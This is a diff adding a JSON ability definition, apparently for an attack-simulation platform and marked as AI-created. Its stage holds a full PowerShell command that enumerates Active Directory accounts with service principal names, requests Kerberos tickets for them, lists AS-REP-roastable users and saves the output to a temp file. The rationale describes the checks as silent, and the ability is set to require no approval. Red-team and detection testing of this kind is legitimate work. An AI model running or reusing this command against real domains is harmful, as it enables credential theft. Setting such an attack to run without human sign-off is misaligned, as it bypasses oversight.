@@ -1,0 +1,31 @@
+{
+  "ability_id": "782e8eeb-4253-4838-9d50-6cf14d2339ca",
+  "skill": "accessing-credentials",
+  "saved_at": "2026-06-24T07:55:10.462099+00:00",
+  "ability": {
+    "name": "Domain Kerberoasting and AS-REP Roasting Check",
+    "description": "Performs non-disruptive domain credential roasting queries against Active Directory via ADSI to harvest roasting hashes.",
+    "mitre_tactic": "credential-access",
+    "mitre_technique_id": "T1558.003",
+    "platform": "windows",
+    "impact_type": null,
+    "default_severity": null,
+    "requires_approval": false,
+    "tags": null,
+    "created_by": "ai",
+    "engagement_id": "2b46bea0854443f1a134f53563af2133"
+  },
+  "stages": [
+    {
+      "stage_name": "ADSI Kerberoast and AS-REP Roast",
+      "stage_order": 1,
+      "executor": "powershell",
+      "command_template": "$d='C:/Windows/Temp/bas'; if(!(Test-Path $d)){ni -ItemType Directory -Force $d|out-null}; $(try { $searcher = [adsisearcher]'(servicePrincipalName=*)'; $searcher.PageSize = 1000; $users = $searcher.FindAll(); foreach($u in $users) { $sam = $u.Properties.samaccountname[0]; $spn = $u.Properties.serviceprincipalname[0]; Add-Type -AssemblyName System.IdentityModel; try { $tg = New-Object System.IdentityModel.Tokens.KerberosReceiverSecurityToken($spn); Write-Output \"SPN found: $spn ($sam)\" } catch {} }; $asrep = [adsisearcher]'(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'; $asrep.PageSize = 1000; $arUsers = $asrep.FindAll(); foreach($au in $arUsers) { Write-Output \"AS-REP Roastable: $($au.Properties.samaccountname[0])\" } } catch { $_ }) | Tee-Object -FilePath $d/roast.txt",
+      "timeout_seconds": 900,
+      "payload_id": null
+    }
+  ],
+  "rationale": "Fulfills the mandatory domain-level techniques requirement (C1, C2) by performing silent ADSI-based checks, requiring only standard domain user credentials.",
+  "provider": "ADSI Searcher",
+  "cited_urls": []
+}
